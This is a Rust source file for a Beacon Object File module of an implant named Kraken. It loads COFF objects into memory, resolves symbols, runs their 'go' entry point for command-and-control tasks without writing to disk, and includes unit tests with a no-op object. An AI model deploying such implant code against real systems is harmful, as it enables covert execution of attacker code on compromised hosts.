//! mod-bof: Beacon Object File execution module for Kraken implant
//!
//! Provides in-memory COFF loader for executing BOF files.
//! BOFs are compiled COFF objects that can be loaded and executed without touching disk.
//!
//! Architecture:
//! 1. Parse COFF header and sections
//! 2. Allocate memory for each section
//! 3. Apply relocations
//! 4. Resolve external symbols (Beacon API + dynamic imports)
//! 5. Call entry point (`go` function)
//! 6. Capture output via Beacon API callbacks
//! 7. Free memory and return output

use common::{BofOutput, KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::BofTask;

pub mod args;
mod beacon_api;
mod coff;
mod loader;

pub struct BofModule {
    id: ModuleId,
}

impl BofModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("bof"),
        }
    }
}

impl Default for BofModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for BofModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "BOF"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: BofTask =
            BofTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let output = execute_bof(&task)?;

        Ok(TaskResult::BofOutput(output))
    }
}

fn execute_bof(task: &BofTask) -> Result<BofOutput, KrakenError> {
    // Parse COFF
    let coff = coff::CoffFile::parse(&task.bof_data)?;

    // Load into memory
    let mut bof_loader = loader::BofLoader::new();
    bof_loader.load(&coff)?;

    // Set up Beacon API output capture
    let output = std::sync::Arc::new(std::sync::Mutex::new(String::new()));
    let output_clone = output.clone();

    beacon_api::set_output_callback(move |s| {
        if let Ok(mut guard) = output_clone.lock() {
            guard.push_str(s);
        }
    });

    // Get entry point
    let entry_name = task.entry_point.as_deref().unwrap_or("go");
    let entry_addr = bof_loader.resolve_symbol(entry_name)?;

    // Prepare arguments
    let args = task.arguments.as_deref().unwrap_or(&[]);

    // Execute
    let exit_code = unsafe { bof_loader.execute(entry_addr, args) };

    // Clean up
    bof_loader.unload();
    beacon_api::clear_output_callback();

    let output_str = output.lock().map(|g| g.clone()).unwrap_or_default();

    Ok(BofOutput {
        output: output_str,
        exit_code,
        error: None,
    })
}

// For dynamic loading support (only emitted when building standalone dynamic module)
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(BofModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = BofModule::new();
        assert_eq!(module.id().as_str(), "bof");
        assert_eq!(module.name(), "BOF");
    }

    #[test]
    fn test_invalid_coff_data() {
        let module = BofModule::new();

        let task = BofTask {
            bof_data: vec![0x00, 0x01, 0x02, 0x03], // Invalid COFF
            entry_point: None,
            arguments: None,
        };

        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);

        assert!(result.is_err());
    }

    #[test]
    fn test_noop_bof_load_and_execute() {
        // Minimal noop.o - just a ret instruction
        // This tests the full load and execute path
        let noop_data = include_bytes!("../../../../tests/bof/noop.o");

        let coff = coff::CoffFile::parse(noop_data).expect("failed to parse noop.o");
        assert!(coff.is_64bit);
        assert!(!coff.sections.is_empty());

        // Debug: print section info
        for (i, section) in coff.sections.iter().enumerate() {
            eprintln!(
                "Section {}: name={}, size={}, chars=0x{:08x}",
                i, section.name, section.data.len(), section.characteristics
            );
        }

        // Debug: print symbol info
        for sym in &coff.symbols {
            if !sym.name.is_empty() {
                eprintln!(
                    "Symbol: name={}, value={}, section={}",
                    sym.name, sym.value, sym.section
                );
            }
        }

        // Verify 'go' symbol exists
        let has_go = coff.symbols.iter().any(|s| s.name == "go");
        assert!(has_go, "noop.o should have 'go' symbol");

        // Test loading
        let mut bof_loader = loader::BofLoader::new();
        bof_loader.load(&coff).expect("failed to load noop.o");

        // Resolve entry point
        let entry = bof_loader
            .resolve_symbol("go")
            .expect("failed to resolve 'go' symbol");
        eprintln!("Entry point 'go' resolved to {:?}", entry);
        assert!(!entry.is_null());

        // Debug: print bytes at entry point
        unsafe {
            let bytes = std::slice::from_raw_parts(entry as *const u8, 16);
            eprintln!("Bytes at entry: {:02x?}", bytes);
        }

        // Execute - on Linux this should work since it's just 'ret'
        eprintln!("About to execute...");
        let exit_code = unsafe { bof_loader.execute(entry, &[]) };
        eprintln!("Execution complete, exit_code={}", exit_code);
        assert_eq!(exit_code, 0);
    }
}
